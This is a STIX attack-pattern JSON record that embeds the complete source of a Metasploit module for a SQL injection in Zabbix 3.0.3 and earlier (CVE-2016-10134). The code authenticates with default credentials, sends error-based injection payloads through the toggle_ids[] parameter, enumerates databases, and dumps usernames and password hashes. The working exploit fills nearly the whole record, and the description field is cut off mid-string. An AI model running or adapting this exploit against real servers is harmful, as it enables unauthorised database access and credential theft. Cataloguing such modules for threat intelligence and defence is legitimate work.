{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4627ff7-5a2a-450a-8754-d0c8d558e02c",
    "created": "2024-08-14T16:31:26.842212Z",
    "modified": "2024-08-14T16:31:26.842216Z",
    "name": "Zabbix toggle_ids SQL Injection",
    "description": " This module will exploit a SQL injection in Zabbix 3.0.3 and likely prior in order to save the current usernames and password hashes from the database to a JSON file.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/zabbix_toggleids_sqli.rb",
            "external_id": "zabbix_toggleids_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Aug/60"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zabbix toggle_ids SQL Injection',\n      'Description'    => %q{\n      This module will exploit a SQL injection in Zabbix 3.0.3 and\n      likely prior in order to save the current usernames and\n      password hashes from the database to a JSON file.\n      },\n      'References'     =>\n        [\n          ['CVE', '2016-10134'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Aug/60']\n        ],\n      'Author'         =>\n        [\n          '1n3@hushmail.com', #discovery\n          'bperry' #module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2016-08-11'\n    ))\n\n    register_options(\n      [\n        OptBool.new('REQUIREAUTH', [true, 'Enforce authentication', false]),\n        OptString.new('USERNAME', [false, 'The username to authenticate with', 'Admin']),\n        OptString.new('PASSWORD', [false, 'The password to authenticate with', 'zabbix']),\n        OptString.new('TARGETURI', [true, 'The relative URI for Zabbix', '/zabbix'])\n      ])\n  end\n\n  def check\n\n    sid, cookies = authenticate\n\n    left_marker = Rex::Text.rand_text_alpha(5)\n    right_marker = Rex::Text.rand_text_alpha(5)\n    flag = Rex::Text.rand_text_alpha(5)\n\n    query = \"AND (SELECT 1256 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]}\"\n    query << \",(SELECT MID((IFNULL(CAST(0x#{flag.unpack(\"H*\")[0]} AS CHAR),0x20)),1,54)\"\n    query << \" FROM dual LIMIT 0,1),0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x FROM\"\n    query << ' INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'\n\n    res = make_injected_request(query, sid, cookies)\n\n    unless res and res.body\n      return Msf::Exploit::CheckCode::Safe\n    end\n\n    match = /#{left_marker}(.*)#{right_marker}/.match(res.body)\n\n    unless match\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    if match[1] == flag\n      return Msf::Exploit::CheckCode::Vulnerable\n    end\n\n    Msf::Exploit::CheckCode::Safe\n  end\n\n  def run\n    sid, cookies = authenticate\n\n    left_marker = Rex::Text.rand_text_alpha(5)\n    right_marker = Rex::Text.rand_text_alpha(5)\n\n    query = \" AND (SELECT 5361 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]}\"\n    query << \",(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM\"\n    query << \" INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x\"\n    query << \" FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\"\n\n    res = make_injected_request(query, sid, cookies)\n\n    unless res and res.body\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    match = /#{left_marker}(.*)#{right_marker}/.match(res.body)\n\n    unless match\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    count = match[1].to_i\n\n    dbs = []\n    0.upto(count-1) do |cur|\n\n      get_dbs = \" AND (SELECT 5184 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]}\"\n      get_dbs << \",(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54)\"\n      get_dbs << \" FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{cur},1),0x#{right_marker.unpack(\"H*\")[0]},\"\n      get_dbs << \"FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\"\n\n      res = make_injected_request(get_dbs, sid, cookies)\n\n      unless res and res.body\n        fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n      end\n\n      match = /#{left_marker}(.*)#{right_marker}/.match(res.body)\n\n      unless match\n        fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n      end\n\n      dbs << match[1]\n    end\n\n    dbs.delete(\"mysql\")\n    dbs.delete(\"performance_schema\")\n    dbs.delete(\"information_schema\")\n\n    users = []\n    dbs.each do |db|\n      cols = [\"alias\", \"passwd\"]\n\n      user_count = \" AND (SELECT 6262 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]}\"\n      user_count << \",(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM\"\n      user_count << \" #{db}.users),0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x FROM\"\n      user_count << \" INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\"\n\n      res = make_injected_request(user_count, sid, cookies)\n\n      unless res and res.body\n        fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n      end\n\n      match = /#{left_marker}(.*)#{right_marker}/.match(res.body)\n\n      unless match\n        fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n      end\n\n      count = match[1].to_i\n\n      0.upto(count-1) do |cur|\n        user = {}\n        cols.each do |col|\n          get_col = \" AND (SELECT 6334 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]}\"\n          get_col << \",(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),1,54)\"\n          get_col << \" FROM #{db}.users ORDER BY alias LIMIT #{cur},1),0x#{right_marker.unpack(\"H*\")[0]}\"\n          get_col << ',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'\n\n          res = make_injected_request(get_col, sid, cookies)\n\n          unless res and res.body\n            fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n          end\n\n          match = /#{left_marker}(.*)#{right_marker}/.match(res.body)\n\n          unless match\n            fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n          end\n\n          user[col] = match[1]\n        end\n        users << user\n      end\n    end\n\n    loot = store_loot(\"zabbixusers.json\",\"text/plain\", rhost, users.to_json)\n\n    print_good('Users and password hashes stored at ' + loot)\n\n  end\n\n  def authenticate\n   res = send_request_cgi({\n     'uri' => normalize_uri(target_uri.path, 'index.php')\n   })\n\n   unless res and res.body\n     fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n   end\n\n   cookies = res.get_cookies\n\n   match = /name=\"sid\" value=\"(.*?)\">/.match(res.body)\n\n   unless match\n     fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n   end\n\n   sid = match[1]\n\n   if datastore['REQUIREAUTH']\n\n     res = send_request_cgi({\n       'uri' => normalize_uri(target_uri.path, 'index.php'),\n       'method' => 'POST',\n       'vars_post' => {\n         'sid' => sid,\n         'form_refresh' => 1,\n         'name' => datastore['USERNAME'],\n         'password' => datastore['PASSWORD'],\n         'autologin' => 1,\n         'enter' => 'Sign in'\n       },\n       'cookie' => cookies\n     })\n\n     unless res\n       fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n     end\n\n     if res.code == 302\n       cookies = res.get_cookies\n\n       res = send_request_cgi({\n         'uri' => normalize_uri(target_uri.path, 'latest.php'),\n         'vars_get' => {\n          'ddreset' => '1'\n         },\n         'cookies' => cookies\n       })\n\n       unless res and res.body\n         fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n       end\n\n       cookies = res.get_cookies\n       match = /name=\"sid\" value=\"(.*?)\">/.match(res.body)\n\n       unless match\n         fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n       end\n\n       sid = match[1]\n     elsif\n       fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n     end\n   end\n\n   return sid, cookies\n  end\n\n  def make_injected_request(sql, sid, cookies)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'latest.php'),\n      'method' => 'POST',\n      'vars_get' => {\n        'output' => 'ajax',\n        'sid' => sid\n      },\n      'vars_post' => {\n        'favobj' => 'toggle',\n        'toggle_ids[]' => '348 ' + sql,\n        'toggle_open_state' => 0\n      },\n      'cookie' => cookies\n    })\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-08-11"
}